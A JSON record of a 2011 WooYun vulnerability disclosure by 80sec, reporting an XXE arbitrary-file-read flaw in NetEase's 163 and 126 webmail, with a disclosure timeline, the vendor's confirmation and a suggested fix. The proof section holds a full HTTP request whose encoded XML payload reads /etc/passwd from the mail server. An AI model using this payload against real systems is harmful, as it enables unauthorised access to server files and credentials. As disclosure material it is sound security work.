{"id": 21772, "wybug_id": "wooyun-2011-03265", "wybug_title": "163邮箱126邮箱任意文件下载漏洞", "wybug_corp": "网易", "wybug_author": "80sec", "wybug_date": "2011-11-09 21:45", "wybug_open_date": "2011-12-09 21:46", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "敏感信息泄漏", "任意文件读取"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2011-11-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2011-11-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2011-11-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2011-11-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2011-12-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2011-12-09：\t细节向公众公开  简要描述： 163邮箱和126邮箱在实现上存在缺陷，利用80sec发布的xml解析漏洞可以读取服务器上任意文件，包括服务器配置文件和敏感的数据库文件，结合上下文逻辑可能可以获得更高权限。 详细说明：  163的服务器在接受和传递参数时使用的是xml的格式进行数据传递，但是根据80sec的安全公告，如果服务端在处理xml数据时格式不对就会导致安全漏洞，使用应用上下文的权限来获取任意文件内容，结合逻辑可能可以得到更多的权限   漏洞证明：  神奇的代码哦，就是简单的在xml头部附加我们的恶意就可以了\nPOST /js4/s?sid=jAZNlaKzhPcBsFgYIazzsbDOwpsMYtTh&func=mbox:compose&l=compose&action=deliver HTTP/1.1Content-Type: application/x-www-form-urlencodedAccept: text/javascriptReferer: http://twebmail.mail.163.com/js4/index.jsp?sid=jAZNlaKzhPcBsFgYIazzsbDOwpsMYtThAccept-Language: zh-cnUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; InfoPath.2; .NET4.0C; .NET4.0E)Host: twebmail.mail.163.comContent-Length: 1348Connection: Keep-AliveCache-Control: no-cacheCookie: it's a secertvar=%3C%3Fxml+version%3D%221.0%22%3F%3E%3C%21DOCTYPE+copyright+%5B%3C%21ENTITY+hi80sec+SYSTEM+%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cobject%3E%3Cstring+name%3D%22id%22%3Ec%3A1320845207002%3C%2Fstring%3E%3Cobject+name%3D%22attrs%22%3E%3Cstring+name%3D%22account%22%3E%22Hi%22%26lt%3Bfukhaha%40163.com%26gt%3B%3C%2Fstring%3E%3Cboolean+name%3D%22showOneRcpt%22%3Efalse%3C%2Fboolean%3E%3Carray+name%3D%22to%22%3E%3Cstring%3E%22fukhaha%40163.com%22%26lt%3Bfukhaha%40163.com%26gt%3B%3C%2Fstring%3E%3C%2Farray%3E%3Carray+name%3D%22cc%22%2F%3E%3Carray+name%3D%22bcc%22%2F%3E%3Cstring+name%3D%22subject%22%3Eshow+me+the+%2Fetc%2Fpasswd%3C%2Fstring%3E%3Cboolean+name%3D%22isHtml%22%3Etrue%3C%2Fboolean%3E%3Cstring+name%3D%22content%22%3E%26lt%3Bdiv+style%3D%27line-height%3A1.7%3Bcolor%3A%23000000%3Bfont-size%3A14px%3Bfont-family%3Aarial%27%26gt%3B%26lt%3BDIV%26gt%3B%26hi80sec%3B%26lt%3B%2FDIV%26gt%3B%26lt%3B%2Fdiv%26gt%3B%3C%2Fstring%3E%3Cint+name%3D%22priority%22%3E3%3C%2Fint%3E%3Cboolean+name%3D%22saveSentCopy%22%3Etrue%3C%2Fboolean%3E%3Cboolean+name%3D%22requestReadReceipt%22%3Efalse%3C%2Fboolean%3E%3Cstring+name%3D%22charset%22%3EGBK%3C%2Fstring%3E%3C%2Fobject%3E%3Cboolean+name%3D%22returnInfo%22%3Efalse%3C%2Fboolean%3E%3Cstring+name%3D%22action%22%3Edeliver%3C%2Fstring%3E%3Cint+name%3D%22saveSentLimit%22%3E1%3C%2Fint%3E%3C%2Fobject%3E\n\n\n   修复方案：  修改服务端xml解析器 禁用外部实体   版权声明：转载请注明来源 80sec@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2011-11-10 10:56 厂商回复： 感谢80sec，尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2011-11-11 17:17 |    \t\t小恒 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:2        | 黑夜中……跟雨捉迷藏)\t\t \n  求真相    \n     2013-04-24 09:35 |    \t\twxp \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:1        | 喜欢挖掘，深入了解本质)\t\t \n  所以所不要用simplexml_load    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}